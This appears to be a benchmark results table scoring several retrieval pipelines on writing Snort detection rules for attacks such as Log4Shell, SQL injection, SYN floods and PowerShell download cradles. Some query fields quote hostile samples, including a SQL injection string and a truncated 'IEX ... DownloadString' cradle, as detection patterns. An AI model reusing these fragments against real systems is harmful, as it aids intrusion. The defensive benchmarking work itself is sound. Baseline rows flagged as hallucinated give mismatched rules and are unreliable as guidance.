query_id,architecture,query,precision_at_3,recall_at_3,recall_at_5,mrr,ndcg_at_5,family_accuracy,type_accuracy,protocol_accuracy,port_accuracy,snort_syntax_valid,rule_token_jaccard,hallucination_flag,expected_doc_id,retrieved_ids,generated_family,expected_family,generated_type,expected_type,generated_rule
Q_025,agentic_rag,"I need detection for as a security analyst, I want to detect this behavior: Detect periodic HTTP beaconing using an old suspicious User-Agent header. Observed log: HTTP GET /gate.php every=60s user-agent=Mozilla/4.0 src=10.0.6.82 dst=198.51.100.201",0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0045,SNORT_0045;SNORT_0113;SNORT_0028;SNORT_0062;SNORT_0096,Malware_C2,Malware_C2,HTTP C2 Beacon,HTTP C2 Beacon,"alert tcp $HOME_NET any -> $EXTERNAL_NET 80 (msg:""Possible HTTP C2 beacon with suspicious User-Agent""; flow:to_server,established; content:""User-Agent|3a| Mozilla/4.0""; http_header; detection_filter:track by_src, count 10, seconds 300; classtype:trojan-activity; sid:1000045; rev:1;)"
Q_026,baseline,"Write a Snort rule for as a security analyst, I want to detect this behavior: Generate a Snort rule for HTTP payloads with ${jndi: patterns.",0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.5,1.0,SNORT_0083,,Web_Attack,Exploitation,Directory Traversal,Log4Shell JNDI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible directory traversal attempt""; flow:to_server,established; content:""../""; http_uri; classtype:web-application-attack; sid:1000007; rev:1;)"
Q_026,rag_classic,"Write a Snort rule for as a security analyst, I want to detect this behavior: Generate a Snort rule for HTTP payloads with ${jndi: patterns.",0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0083,SNORT_0083;SNORT_0049;SNORT_0032;SNORT_0066;SNORT_0100,Exploitation,Exploitation,Log4Shell JNDI Pattern,Log4Shell JNDI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 8443 (msg:""Possible Log4Shell JNDI exploit attempt""; flow:to_server,established; content:""${jndi:""; nocase; classtype:web-application-attack; sid:1000083; rev:1;)"
Q_026,rag_rerank,"Write a Snort rule for as a security analyst, I want to detect this behavior: Generate a Snort rule for HTTP payloads with ${jndi: patterns.",0.3333333333333333,1.0,1.0,0.3333333333333333,0.5,1.0,1.0,1.0,0.0,1.0,0.8333333333333334,0.0,SNORT_0083,SNORT_0049;SNORT_0032;SNORT_0083;SNORT_0066;SNORT_0100,Exploitation,Exploitation,Log4Shell JNDI Pattern,Log4Shell JNDI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible Log4Shell JNDI exploit attempt""; flow:to_server,established; content:""${jndi:""; nocase; classtype:web-application-attack; sid:1000049; rev:1;)"
Q_026,rag_hybrid,"Write a Snort rule for as a security analyst, I want to detect this behavior: Generate a Snort rule for HTTP payloads with ${jndi: patterns.",0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0083,SNORT_0083;SNORT_0049;SNORT_0032;SNORT_0066;SNORT_0151,Exploitation,Exploitation,Log4Shell JNDI Pattern,Log4Shell JNDI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 8443 (msg:""Possible Log4Shell JNDI exploit attempt""; flow:to_server,established; content:""${jndi:""; nocase; classtype:web-application-attack; sid:1000083; rev:1;)"
Q_026,multi_hop,"Write a Snort rule for as a security analyst, I want to detect this behavior: Generate a Snort rule for HTTP payloads with ${jndi: patterns.",0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0083,SNORT_0083;SNORT_0151;SNORT_0049;SNORT_0032;SNORT_0066,Exploitation,Exploitation,Log4Shell JNDI Pattern,Log4Shell JNDI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 8443 (msg:""Possible Log4Shell JNDI exploit attempt""; flow:to_server,established; content:""${jndi:""; nocase; classtype:web-application-attack; sid:1000083; rev:1;)"
Q_026,graph_rag,"Write a Snort rule for as a security analyst, I want to detect this behavior: Generate a Snort rule for HTTP payloads with ${jndi: patterns.",0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,1.0,0.8333333333333334,0.0,SNORT_0083,SNORT_0032;SNORT_0066;SNORT_0049;SNORT_0101;SNORT_0033,Exploitation,Exploitation,Log4Shell JNDI Pattern,Log4Shell JNDI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible Log4Shell JNDI exploit attempt""; flow:to_server,established; content:""${jndi:""; nocase; classtype:web-application-attack; sid:1000032; rev:1;)"
Q_026,agentic_rag,"Write a Snort rule for as a security analyst, I want to detect this behavior: Generate a Snort rule for HTTP payloads with ${jndi: patterns.",0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0083,SNORT_0083;SNORT_0049;SNORT_0032;SNORT_0066;SNORT_0151,Exploitation,Exploitation,Log4Shell JNDI Pattern,Log4Shell JNDI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 8443 (msg:""Possible Log4Shell JNDI exploit attempt""; flow:to_server,established; content:""${jndi:""; nocase; classtype:web-application-attack; sid:1000083; rev:1;)"
Q_027,baseline,Write a Snort rule for sOC ticket: suspicious Brute_Force activity observed. Identify FTP authentication guessing from one external source.,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.6451612903225806,1.0,SNORT_0129,,Brute_Force,Brute_Force,SSH Brute Force,FTP Brute Force,"alert tcp $EXTERNAL_NET any -> $HOME_NET 22 (msg:""Possible SSH brute force attempts""; flow:to_server,established; detection_filter:track by_src, count 15, seconds 60; classtype:attempted-recon; sid:1000009; rev:1;)"
Q_027,rag_classic,Write a Snort rule for sOC ticket: suspicious Brute_Force activity observed. Identify FTP authentication guessing from one external source.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0129,SNORT_0129;SNORT_0095;SNORT_0146;SNORT_0061;SNORT_0112,Brute_Force,Brute_Force,FTP Brute Force,FTP Brute Force,"alert tcp $EXTERNAL_NET any -> $HOME_NET 21 (msg:""Possible FTP brute force USER attempts""; flow:to_server,established; content:""USER""; nocase; detection_filter:track by_src, count 20, seconds 60; classtype:attempted-recon; sid:1000129; rev:1;)"
Q_027,rag_rerank,Write a Snort rule for sOC ticket: suspicious Brute_Force activity observed. Identify FTP authentication guessing from one external source.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0129,SNORT_0129;SNORT_0095;SNORT_0146;SNORT_0061;SNORT_0112,Brute_Force,Brute_Force,FTP Brute Force,FTP Brute Force,"alert tcp $EXTERNAL_NET any -> $HOME_NET 21 (msg:""Possible FTP brute force USER attempts""; flow:to_server,established; content:""USER""; nocase; detection_filter:track by_src, count 20, seconds 60; classtype:attempted-recon; sid:1000129; rev:1;)"
Q_027,rag_hybrid,Write a Snort rule for sOC ticket: suspicious Brute_Force activity observed. Identify FTP authentication guessing from one external source.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0129,SNORT_0129;SNORT_0095;SNORT_0146;SNORT_0061;SNORT_0112,Brute_Force,Brute_Force,FTP Brute Force,FTP Brute Force,"alert tcp $EXTERNAL_NET any -> $HOME_NET 21 (msg:""Possible FTP brute force USER attempts""; flow:to_server,established; content:""USER""; nocase; detection_filter:track by_src, count 20, seconds 60; classtype:attempted-recon; sid:1000129; rev:1;)"
Q_027,multi_hop,Write a Snort rule for sOC ticket: suspicious Brute_Force activity observed. Identify FTP authentication guessing from one external source.,0.3333333333333333,1.0,1.0,0.3333333333333333,0.5,1.0,1.0,1.0,1.0,1.0,0.9285714285714286,0.0,SNORT_0129,SNORT_0095;SNORT_0146;SNORT_0129;SNORT_0061;SNORT_0112,Brute_Force,Brute_Force,FTP Brute Force,FTP Brute Force,"alert tcp $EXTERNAL_NET any -> $HOME_NET 21 (msg:""Possible FTP brute force USER attempts""; flow:to_server,established; content:""USER""; nocase; detection_filter:track by_src, count 20, seconds 60; classtype:attempted-recon; sid:1000095; rev:1;)"
Q_027,graph_rag,Write a Snort rule for sOC ticket: suspicious Brute_Force activity observed. Identify FTP authentication guessing from one external source.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0129,SNORT_0129;SNORT_0095;SNORT_0146;SNORT_0112;SNORT_0061,Brute_Force,Brute_Force,FTP Brute Force,FTP Brute Force,"alert tcp $EXTERNAL_NET any -> $HOME_NET 21 (msg:""Possible FTP brute force USER attempts""; flow:to_server,established; content:""USER""; nocase; detection_filter:track by_src, count 20, seconds 60; classtype:attempted-recon; sid:1000129; rev:1;)"
Q_027,agentic_rag,Write a Snort rule for sOC ticket: suspicious Brute_Force activity observed. Identify FTP authentication guessing from one external source.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0129,SNORT_0129;SNORT_0095;SNORT_0146;SNORT_0061;SNORT_0112,Brute_Force,Brute_Force,FTP Brute Force,FTP Brute Force,"alert tcp $EXTERNAL_NET any -> $HOME_NET 21 (msg:""Possible FTP brute force USER attempts""; flow:to_server,established; content:""USER""; nocase; detection_filter:track by_src, count 20, seconds 60; classtype:attempted-recon; sid:1000129; rev:1;)"
Q_028,baseline,Need IDS detection logic for DNS Amplification: Detect many DNS ANY queries that may be used for amplification. Include protocol and threshold constraints.,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.3157894736842105,1.0,SNORT_0065,,Brute_Force,DNS_Attack,SSH Brute Force,DNS Amplification,"alert tcp $EXTERNAL_NET any -> $HOME_NET 22 (msg:""Possible SSH brute force attempts""; flow:to_server,established; detection_filter:track by_src, count 15, seconds 60; classtype:attempted-recon; sid:1000009; rev:1;)"
Q_028,rag_classic,Need IDS detection logic for DNS Amplification: Detect many DNS ANY queries that may be used for amplification. Include protocol and threshold constraints.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0065,SNORT_0065;SNORT_0082;SNORT_0048;SNORT_0133;SNORT_0014,DNS_Attack,DNS_Attack,DNS Amplification,DNS Amplification,"alert udp $EXTERNAL_NET any -> $HOME_NET 53 (msg:""Possible DNS amplification ANY query abuse""; content:""|00 FF|""; offset:2; detection_filter:track by_src, count 40, seconds 20; classtype:attempted-dos; sid:1000065; rev:1;)"
Q_028,rag_rerank,Need IDS detection logic for DNS Amplification: Detect many DNS ANY queries that may be used for amplification. Include protocol and threshold constraints.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0065,SNORT_0065;SNORT_0082;SNORT_0048;SNORT_0133;SNORT_0014,DNS_Attack,DNS_Attack,DNS Amplification,DNS Amplification,"alert udp $EXTERNAL_NET any -> $HOME_NET 53 (msg:""Possible DNS amplification ANY query abuse""; content:""|00 FF|""; offset:2; detection_filter:track by_src, count 40, seconds 20; classtype:attempted-dos; sid:1000065; rev:1;)"
Q_028,rag_hybrid,Need IDS detection logic for DNS Amplification: Detect many DNS ANY queries that may be used for amplification. Include protocol and threshold constraints.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0065,SNORT_0065;SNORT_0082;SNORT_0048;SNORT_0132;SNORT_0081,DNS_Attack,DNS_Attack,DNS Amplification,DNS Amplification,"alert udp $EXTERNAL_NET any -> $HOME_NET 53 (msg:""Possible DNS amplification ANY query abuse""; content:""|00 FF|""; offset:2; detection_filter:track by_src, count 40, seconds 20; classtype:attempted-dos; sid:1000065; rev:1;)"
Q_028,multi_hop,Need IDS detection logic for DNS Amplification: Detect many DNS ANY queries that may be used for amplification. Include protocol and threshold constraints.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0065,SNORT_0065;SNORT_0082;SNORT_0048;SNORT_0150;SNORT_0014,DNS_Attack,DNS_Attack,DNS Amplification,DNS Amplification,"alert udp $EXTERNAL_NET any -> $HOME_NET 53 (msg:""Possible DNS amplification ANY query abuse""; content:""|00 FF|""; offset:2; detection_filter:track by_src, count 40, seconds 20; classtype:attempted-dos; sid:1000065; rev:1;)"
Q_028,graph_rag,Need IDS detection logic for DNS Amplification: Detect many DNS ANY queries that may be used for amplification. Include protocol and threshold constraints.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0065,SNORT_0065;SNORT_0048;SNORT_0082;SNORT_0014;SNORT_0133,DNS_Attack,DNS_Attack,DNS Amplification,DNS Amplification,"alert udp $EXTERNAL_NET any -> $HOME_NET 53 (msg:""Possible DNS amplification ANY query abuse""; content:""|00 FF|""; offset:2; detection_filter:track by_src, count 40, seconds 20; classtype:attempted-dos; sid:1000065; rev:1;)"
Q_028,agentic_rag,Need IDS detection logic for DNS Amplification: Detect many DNS ANY queries that may be used for amplification. Include protocol and threshold constraints.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0065,SNORT_0065;SNORT_0082;SNORT_0048;SNORT_0132;SNORT_0081,DNS_Attack,DNS_Attack,DNS Amplification,DNS Amplification,"alert udp $EXTERNAL_NET any -> $HOME_NET 53 (msg:""Possible DNS amplification ANY query abuse""; content:""|00 FF|""; offset:2; detection_filter:track by_src, count 40, seconds 20; classtype:attempted-dos; sid:1000065; rev:1;)"
Q_029,baseline,"As a security analyst, I want to detect this behavior: Identify denial-of-service behavior with many SYN packets to port 443.",0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.4838709677419355,1.0,SNORT_0139,,Reconnaissance,DoS_DDoS,TCP SYN Port Scan,TCP SYN Flood,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible TCP SYN scan against HTTP""; flags:S; detection_filter:track by_src, count 20, seconds 10; classtype:network-scan; sid:1000001; rev:1;)"
Q_029,rag_classic,"As a security analyst, I want to detect this behavior: Identify denial-of-service behavior with many SYN packets to port 443.",0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0139,SNORT_0139;SNORT_0088;SNORT_0069;SNORT_0122;SNORT_0018,DoS_DDoS,DoS_DDoS,TCP SYN Flood,TCP SYN Flood,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible TCP SYN flood against HTTPS""; flags:S; detection_filter:track by_dst, count 200, seconds 5; classtype:attempted-dos; sid:1000139; rev:1;)"
Q_029,rag_rerank,"As a security analyst, I want to detect this behavior: Identify denial-of-service behavior with many SYN packets to port 443.",0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0139,SNORT_0139;SNORT_0122;SNORT_0088;SNORT_0079;SNORT_0069,DoS_DDoS,DoS_DDoS,TCP SYN Flood,TCP SYN Flood,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible TCP SYN flood against HTTPS""; flags:S; detection_filter:track by_dst, count 200, seconds 5; classtype:attempted-dos; sid:1000139; rev:1;)"
Q_029,rag_hybrid,"As a security analyst, I want to detect this behavior: Identify denial-of-service behavior with many SYN packets to port 443.",0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0139,SNORT_0139;SNORT_0088;SNORT_0069;SNORT_0018;SNORT_0122,DoS_DDoS,DoS_DDoS,TCP SYN Flood,TCP SYN Flood,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible TCP SYN flood against HTTPS""; flags:S; detection_filter:track by_dst, count 200, seconds 5; classtype:attempted-dos; sid:1000139; rev:1;)"
Q_029,multi_hop,"As a security analyst, I want to detect this behavior: Identify denial-of-service behavior with many SYN packets to port 443.",0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0139,SNORT_0139;SNORT_0088;SNORT_0122;SNORT_0071;SNORT_0105,DoS_DDoS,DoS_DDoS,TCP SYN Flood,TCP SYN Flood,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible TCP SYN flood against HTTPS""; flags:S; detection_filter:track by_dst, count 200, seconds 5; classtype:attempted-dos; sid:1000139; rev:1;)"
Q_029,graph_rag,"As a security analyst, I want to detect this behavior: Identify denial-of-service behavior with many SYN packets to port 443.",0.3333333333333333,1.0,1.0,0.5,0.6309297535714575,0.0,0.0,1.0,0.0,1.0,0.4838709677419355,1.0,SNORT_0139,SNORT_0069;SNORT_0139;SNORT_0037;SNORT_0122;SNORT_0088,Reconnaissance,DoS_DDoS,TCP SYN Port Scan,TCP SYN Flood,"alert tcp $EXTERNAL_NET any -> $HOME_NET 22 (msg:""Possible TCP SYN scan against SSH""; flags:S; detection_filter:track by_src, count 20, seconds 10; classtype:network-scan; sid:1000069; rev:1;)"
Q_029,agentic_rag,"As a security analyst, I want to detect this behavior: Identify denial-of-service behavior with many SYN packets to port 443.",0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0139,SNORT_0139;SNORT_0088;SNORT_0069;SNORT_0018;SNORT_0122,DoS_DDoS,DoS_DDoS,TCP SYN Flood,TCP SYN Flood,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible TCP SYN flood against HTTPS""; flags:S; detection_filter:track by_dst, count 200, seconds 5; classtype:attempted-dos; sid:1000139; rev:1;)"
Q_030,baseline,Need IDS detection logic for SQL Injection: Detect SQL injection attempts using UNION SELECT in HTTP URI. Include protocol and threshold constraints. Observed log: HTTP URI contains /login.php?user=admin' OR '1'='1 from 203.0.113.97,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,SNORT_0005,,Web_Attack,Web_Attack,SQL Injection,SQL Injection,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible SQL injection UNION SELECT attempt""; flow:to_server,established; content:""UNION""; nocase; http_uri; content:""SELECT""; nocase; http_uri; classtype:web-application-attack; sid:1000005; rev:1;)"
Q_030,rag_classic,Need IDS detection logic for SQL Injection: Detect SQL injection attempts using UNION SELECT in HTTP URI. Include protocol and threshold constraints. Observed log: HTTP URI contains /login.php?user=admin' OR '1'='1 from 203.0.113.97,0.3333333333333333,1.0,1.0,0.5,0.6309297535714575,1.0,1.0,1.0,0.0,1.0,0.8333333333333334,0.0,SNORT_0005,SNORT_0039;SNORT_0005;SNORT_0056;SNORT_0141;SNORT_0090,Web_Attack,Web_Attack,SQL Injection,SQL Injection,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible SQL injection UNION SELECT attempt""; flow:to_server,established; content:""UNION""; nocase; http_uri; content:""SELECT""; nocase; http_uri; classtype:web-application-attack; sid:1000039; rev:1;)"
Q_030,rag_rerank,Need IDS detection logic for SQL Injection: Detect SQL injection attempts using UNION SELECT in HTTP URI. Include protocol and threshold constraints. Observed log: HTTP URI contains /login.php?user=admin' OR '1'='1 from 203.0.113.97,0.3333333333333333,1.0,1.0,0.5,0.6309297535714575,1.0,1.0,1.0,0.0,1.0,0.8333333333333334,0.0,SNORT_0005,SNORT_0039;SNORT_0005;SNORT_0056;SNORT_0141;SNORT_0124,Web_Attack,Web_Attack,SQL Injection,SQL Injection,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible SQL injection UNION SELECT attempt""; flow:to_server,established; content:""UNION""; nocase; http_uri; content:""SELECT""; nocase; http_uri; classtype:web-application-attack; sid:1000039; rev:1;)"
Q_030,rag_hybrid,Need IDS detection logic for SQL Injection: Detect SQL injection attempts using UNION SELECT in HTTP URI. Include protocol and threshold constraints. Observed log: HTTP URI contains /login.php?user=admin' OR '1'='1 from 203.0.113.97,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0005,SNORT_0005;SNORT_0039;SNORT_0056;SNORT_0124;SNORT_0141,Web_Attack,Web_Attack,SQL Injection,SQL Injection,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible SQL injection UNION SELECT attempt""; flow:to_server,established; content:""UNION""; nocase; http_uri; content:""SELECT""; nocase; http_uri; classtype:web-application-attack; sid:1000005; rev:1;)"
Q_030,multi_hop,Need IDS detection logic for SQL Injection: Detect SQL injection attempts using UNION SELECT in HTTP URI. Include protocol and threshold constraints. Observed log: HTTP URI contains /login.php?user=admin' OR '1'='1 from 203.0.113.97,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0005,SNORT_0005;SNORT_0039;SNORT_0056;SNORT_0124;SNORT_0141,Web_Attack,Web_Attack,SQL Injection,SQL Injection,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible SQL injection UNION SELECT attempt""; flow:to_server,established; content:""UNION""; nocase; http_uri; content:""SELECT""; nocase; http_uri; classtype:web-application-attack; sid:1000005; rev:1;)"
Q_030,graph_rag,Need IDS detection logic for SQL Injection: Detect SQL injection attempts using UNION SELECT in HTTP URI. Include protocol and threshold constraints. Observed log: HTTP URI contains /login.php?user=admin' OR '1'='1 from 203.0.113.97,0.3333333333333333,1.0,1.0,0.5,0.6309297535714575,1.0,1.0,1.0,0.0,1.0,0.8333333333333334,0.0,SNORT_0005,SNORT_0039;SNORT_0005;SNORT_0056;SNORT_0124;SNORT_0141,Web_Attack,Web_Attack,SQL Injection,SQL Injection,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible SQL injection UNION SELECT attempt""; flow:to_server,established; content:""UNION""; nocase; http_uri; content:""SELECT""; nocase; http_uri; classtype:web-application-attack; sid:1000039; rev:1;)"
Q_030,agentic_rag,Need IDS detection logic for SQL Injection: Detect SQL injection attempts using UNION SELECT in HTTP URI. Include protocol and threshold constraints. Observed log: HTTP URI contains /login.php?user=admin' OR '1'='1 from 203.0.113.97,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0005,SNORT_0005;SNORT_0039;SNORT_0056;SNORT_0124;SNORT_0141,Web_Attack,Web_Attack,SQL Injection,SQL Injection,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible SQL injection UNION SELECT attempt""; flow:to_server,established; content:""UNION""; nocase; http_uri; content:""SELECT""; nocase; http_uri; classtype:web-application-attack; sid:1000005; rev:1;)"
Q_031,baseline,Generate a Snort rule to detect an ICMP ping sweep where one source probes many internal hosts.,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,1.0,1.0,0.9047619047619048,1.0,SNORT_0036,,Reconnaissance,Reconnaissance,ICMP Ping Sweep,ICMP Ping Sweep,"alert icmp $EXTERNAL_NET any -> $HOME_NET any (msg:""Possible ICMP ping sweep""; itype:8; detection_filter:track by_src, count 30, seconds 20; classtype:network-scan; sid:1000104; rev:1;)"
Q_031,rag_classic,Generate a Snort rule to detect an ICMP ping sweep where one source probes many internal hosts.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0036,SNORT_0036;SNORT_0104;SNORT_0121;SNORT_0070;SNORT_0053,Reconnaissance,Reconnaissance,ICMP Ping Sweep,ICMP Ping Sweep,"alert icmp $EXTERNAL_NET any -> $HOME_NET any (msg:""Possible ICMP ping sweep""; itype:8; detection_filter:track by_src, count 30, seconds 20; classtype:network-scan; sid:1000036; rev:1;)"
Q_031,rag_rerank,Generate a Snort rule to detect an ICMP ping sweep where one source probes many internal hosts.,0.3333333333333333,1.0,1.0,0.3333333333333333,0.5,1.0,1.0,1.0,1.0,1.0,0.9047619047619048,0.0,SNORT_0036,SNORT_0104;SNORT_0121;SNORT_0036;SNORT_0070;SNORT_0053,Reconnaissance,Reconnaissance,ICMP Ping Sweep,ICMP Ping Sweep,"alert icmp $EXTERNAL_NET any -> $HOME_NET any (msg:""Possible ICMP ping sweep""; itype:8; detection_filter:track by_src, count 30, seconds 20; classtype:network-scan; sid:1000104; rev:1;)"
Q_031,rag_hybrid,Generate a Snort rule to detect an ICMP ping sweep where one source probes many internal hosts.,0.3333333333333333,1.0,1.0,0.3333333333333333,0.5,1.0,1.0,1.0,1.0,1.0,0.9047619047619048,0.0,SNORT_0036,SNORT_0121;SNORT_0104;SNORT_0036;SNORT_0070;SNORT_0053,Reconnaissance,Reconnaissance,ICMP Ping Sweep,ICMP Ping Sweep,"alert icmp $EXTERNAL_NET any -> $HOME_NET any (msg:""Possible ICMP ping sweep""; itype:8; detection_filter:track by_src, count 30, seconds 20; classtype:network-scan; sid:1000121; rev:1;)"
Q_031,multi_hop,Generate a Snort rule to detect an ICMP ping sweep where one source probes many internal hosts.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0036,SNORT_0036;SNORT_0070;SNORT_0053;SNORT_0104;SNORT_0121,Reconnaissance,Reconnaissance,ICMP Ping Sweep,ICMP Ping Sweep,"alert icmp $EXTERNAL_NET any -> $HOME_NET any (msg:""Possible ICMP ping sweep""; itype:8; detection_filter:track by_src, count 30, seconds 20; classtype:network-scan; sid:1000036; rev:1;)"
Q_031,graph_rag,Generate a Snort rule to detect an ICMP ping sweep where one source probes many internal hosts.,0.3333333333333333,1.0,1.0,0.3333333333333333,0.5,1.0,1.0,1.0,1.0,1.0,0.9047619047619048,0.0,SNORT_0036,SNORT_0121;SNORT_0104;SNORT_0036;SNORT_0053;SNORT_0070,Reconnaissance,Reconnaissance,ICMP Ping Sweep,ICMP Ping Sweep,"alert icmp $EXTERNAL_NET any -> $HOME_NET any (msg:""Possible ICMP ping sweep""; itype:8; detection_filter:track by_src, count 30, seconds 20; classtype:network-scan; sid:1000121; rev:1;)"
Q_031,agentic_rag,Generate a Snort rule to detect an ICMP ping sweep where one source probes many internal hosts.,0.3333333333333333,1.0,1.0,0.3333333333333333,0.5,1.0,1.0,1.0,1.0,1.0,0.9047619047619048,0.0,SNORT_0036,SNORT_0121;SNORT_0104;SNORT_0036;SNORT_0070;SNORT_0053,Reconnaissance,Reconnaissance,ICMP Ping Sweep,ICMP Ping Sweep,"alert icmp $EXTERNAL_NET any -> $HOME_NET any (msg:""Possible ICMP ping sweep""; itype:8; detection_filter:track by_src, count 30, seconds 20; classtype:network-scan; sid:1000121; rev:1;)"
Q_032,baseline,SOC ticket: suspicious Malware_C2 activity observed. Identify malware staging using powershell and DownloadString keywords. Observed log: POST /cmd body=powershell -nop -w hidden IEX(New-Object Net.WebClient).DownloadString(...) src=10.0.7.137,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,1.0,1.0,0.9047619047619048,1.0,SNORT_0029,,Malware_C2,Malware_C2,PowerShell Download Cradle,PowerShell Download Cradle,"alert tcp $HOME_NET any -> $EXTERNAL_NET 80 (msg:""Possible PowerShell download cradle""; flow:to_server,established; content:""powershell""; nocase; content:""DownloadString""; nocase; classtype:trojan-activity; sid:1000080; rev:1;)"
